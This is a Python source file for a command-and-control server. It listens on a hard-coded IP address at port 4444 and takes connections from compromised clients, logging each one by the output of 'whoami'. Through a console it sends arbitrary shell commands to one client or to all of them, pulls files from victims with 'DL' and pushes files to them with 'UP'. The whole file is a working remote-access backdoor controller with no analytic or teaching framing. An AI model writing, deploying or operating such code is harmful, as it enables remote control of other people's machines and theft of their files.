import cmd
import socket
import os
from _thread import *
import re

ServerSocket = socket.socket()
host = '129.21.49.61'
port = 4444
ThreadCount = 0
cmd_queue={}
connections = []

try:
    ServerSocket.bind((host, port))
except socket.error as e:
    print(str(e))

print('Waitiing for a Connection..')
ServerSocket.listen(5)

def threaded_client(connection, num):
    global cmd_queue
    cmd_queue[num] = None
    while True:
        if cmd_queue[num]:
            if cmd_queue[num][:2] == 'DL':
                args = cmd_queue[num].split()
                connection.send(str.encode(f"DL {args[1]}"))
                with open(args[2], "ab") as file:
                    data = connection.recv(1024)
                    while data != b'DONE':
                        file.write(data)
                        connection.send(str.encode("ACK"))
                        data = connection.recv(1024)
                print(num, ": Saved to", args[2],end='\n\n> ')
            elif cmd_queue[num][:2] == 'UP':
                args = cmd_queue[num].split()
                connection.send(str.encode(f"UP {args[2]}"))
                resp = str(connection.recv(1024),"UTF-8")
                if resp == "READY":
                    with open(args[1], "rb") as file:
                        data = file.read(1024)
                        while data:
                            connection.send(data)
                            resp = str(connection.recv(1024),"UTF-8")
                            if resp != "ACK":
                                print(num, ": Something went wrong in file upload",end='\n\n> ')
                                break
                            data = file.read(1024)
                        connection.send(str.encode("DONE"))
                        resp = connection.recv(1024)
                        print()
                        if resp == b'DONE':
                            print(num, ": File upload complete",end='\n\n> ')
                        else:
                            print(num, ": Something went wrong in file upload",end='\n\n> ')
            else:
                connection.send(str.encode(cmd_queue[num]))
                if cmd_queue[num] == 'exit':
                    break 
                data = str(connection.recv(1024),"UTF-8")
                print()
                print(num,":",data,end='\n\n> ')
            cmd_queue[num] = None
    connection.close()

def connectionManagement():
    global ThreadCount
    while True:
        Client, address = ServerSocket.accept()
        Client.send(str.encode("whoami"))
        user = str(Client.recv(1024),"utf-8").strip()
        print(f'Connected to: {user}@{address[0]}:{str(address[1])}')
        connections.append(f'{user}@{address[0]}:{str(address[1])}')
        start_new_thread(threaded_client, (Client, ThreadCount, ))
        ThreadCount += 1
        print('Thread Number: ' + str(ThreadCount) + "\n> ", end = "")

start_new_thread(connectionManagement, ())

while True:
    data = input()
    if data == "list":
        for i in range(len(connections)):
            print(i, ":", connections[i])
        print("> ", end = "")
    elif data == "exit":
        for i in range(ThreadCount):
            cmd_queue[i] = "exit"
        break
    elif data[:3] == "all":
        for i in range(ThreadCount):
            cmd_queue[i] = data[3:]
    else:
        try:
            nums = re.findall("\d*",data)
            num_size = len(nums[0])
            cmd_queue[int(nums[0])] = data[num_size:].strip()
        except:
            print("> ", end = "")
            pass

ServerSocket.close()
